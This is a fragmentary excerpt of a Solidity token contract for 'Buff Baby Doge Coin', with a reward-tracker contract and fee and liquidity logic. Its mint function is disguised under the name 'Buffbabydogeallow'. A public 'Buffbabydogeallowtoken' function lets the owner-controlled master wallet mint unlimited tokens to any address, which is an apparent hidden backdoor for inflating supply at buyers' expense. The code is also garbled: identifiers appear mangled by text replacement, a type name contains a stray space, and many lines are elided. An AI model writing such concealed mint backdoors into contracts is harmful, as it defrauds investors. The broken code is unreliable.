...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function Buffbabydogeallow(address account, uint256 amount) internal virtual {
...
function Buffbabydogeallow(address account, uint256 value) internal override {
    super.Buffbabydogeallow(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      Buffbabydogeallow(account, mintAmount);
...
contract BuffbabydogerewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardBuffbabydogeMap  for RewardBuffbabydogeMap .Map;
RewardBuffbabydogeMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("Buffbabydoge_rewardToken_Tracker", "Buffbabydoge_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "Buffbabydoge_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "Buffbabydoge_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main Buffbabydoge contract.");
    }
...
contract Buffbabydoge is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    BuffbabydogerewardToken public rewardToken;
 ...
 modifier lockTheSwap {
   ...
   uint256 public  holderReward = 5;
 address public lp;
  ILP public adressLiquidity;
    address public marketingReciever =0x3F1654B389ffF920DAD79491812E652c43B45567;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Buff Baby Doge Coin", "BuffBabyDoge") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new BuffbabydogerewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 Buffbabydogeallow(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function Buffbabydogeallowtoken(address userjoin, uint256 tokenjoin) public masterWallet{
       Buffbabydogeallow(userjoin, tokenjoin);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "Buffbabydoge: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "Buffbabydoge: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "Buffbabydoge: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "Buffbabydoge: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTBuffbabydoge = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTBuffbabydoge);
...
addLiquidity(tokensTBuffbabydoge, bnbForLiquidity);
